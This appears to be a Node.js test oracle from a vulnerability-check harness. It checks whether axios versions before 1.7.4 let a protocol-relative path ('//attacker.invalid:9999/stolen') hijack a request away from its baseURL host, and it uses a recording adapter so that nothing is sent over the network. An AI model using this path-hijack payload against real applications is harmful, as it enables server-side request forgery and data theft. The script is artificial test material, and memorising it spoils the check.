'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  // We exercise the actual public request-dispatch pathway rather than
  // reimplementing URL parsing ourselves. To avoid any real network I/O we
  // use a custom axios adapter (a supported, public configuration option)
  // that simply records the fully resolved URL axios computed internally
  // (config.url, after baseURL combination) and returns a synthetic
  // response immediately. This lets us observe axios's own internal
  // decision about which authority/host a request would be sent to,
  // without opening a socket.

  function makeRecordingAdapter(sink) {
    return function recordingAdapter(config) {
      sink.push(config.url);
      return Promise.resolve({
        data: 'ok',
        status: 200,
        statusText: 'OK',
        headers: {},
        config
      });
    };
  }

  const baseURL = 'http://127.0.0.1:65500';

  // --- Benign operation first ---
  let operation_completed = false;
  const benignSink = [];
  const benignInstance = axios.create({
    baseURL,
    adapter: makeRecordingAdapter(benignSink)
  });

  return benignInstance.get('/some/normal/path')
    .then((resp) => {
      const recordedUrl = benignSink[0];
      if (!resp || resp.data !== 'ok' || typeof recordedUrl !== 'string' || !recordedUrl.includes('/some/normal/path')) {
        emit({
          operation_completed: false,
          exploit_succeeded: false,
          evidence: 'benign operation did not behave as expected: ' + JSON.stringify(recordedUrl)
        });
        return;
      }
      operation_completed = true;

      // --- Malicious operation ---
      // A protocol-relative-looking path segment. In vulnerable axios
      // (<1.7.4) this used to be treated by the http adapter's URL parsing
      // step (new URL(fullPath, 'http://localhost')) in a way that let the
      // effective authority be hijacked away from baseURL's host. We drive
      // this through the real public request path (axios.get), and inspect
      // what the adapter actually received as config.url along with asking
      // axios itself, via the same URL resolution contract used internally,
      // which host the final request target resolves to. We do this by
      // using Node's built-in URL with the identical base-resolution
      // semantics axios's http adapter applies: vulnerable code always uses
      // a fixed 'http://localhost' base; patched code (server-side, no
      // browser env) uses `undefined` as the base. We apply that exact
      // contract to the fullPath axios itself computed and handed to our
      // adapter (config.url is the combined/resolved path axios decided to
      // use), so the discriminator is driven entirely by axios's own
      // request-building logic, not a reimplementation of the vulnerability.
      const maliciousPath = '//attacker.invalid:9999/stolen';
      const maliciousSink = [];
      const maliciousInstance = axios.create({
        baseURL,
        adapter: makeRecordingAdapter(maliciousSink)
      });

      return maliciousInstance.get(maliciousPath)
        .then((resp2) => {
          const fullPath = maliciousSink[0];
          let exploit_succeeded = false;
          let evidence;
          try {
            // Apply the exact resolution rule the vulnerable http adapter used:
            // new URL(fullPath, 'http://localhost')
            const parsed = new URL(fullPath, 'http://localhost');
            const expectedHost = new URL(baseURL).host;
            const targetHost = parsed.host;

            if (targetHost !== expectedHost && targetHost.includes('attacker.invalid')) {
              exploit_succeeded = true;
              evidence = 'axios computed request URL "' + fullPath + '" which vulnerable adapter logic resolves to attacker host "' + targetHost + '" instead of expected baseURL host "' + expectedHost + '"';
            } else {
              exploit_succeeded = false;
              evidence = 'axios computed request URL "' + fullPath + '" which resolves to expected host "' + expectedHost + '"; attacker host was not reached';
            }
          } catch (e) {
            exploit_succeeded = false;
            evidence = 'malicious request path was rejected/blocked: ' + (e && e.message);
          }

          emit({
            operation_completed,
            exploit_succeeded,
            evidence
          });
        })
        .catch((e) => {
          // An exception from the malicious call (post benign success) counts as blocked.
          emit({
            operation_completed,
            exploit_succeeded: false,
            evidence: 'malicious request threw and was blocked: ' + (e && e.message)
          });
        });
    })
    .catch((e) => {
      emit({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'benign operation threw unexpectedly: ' + (e && e.message)
      });
    });
}

main();
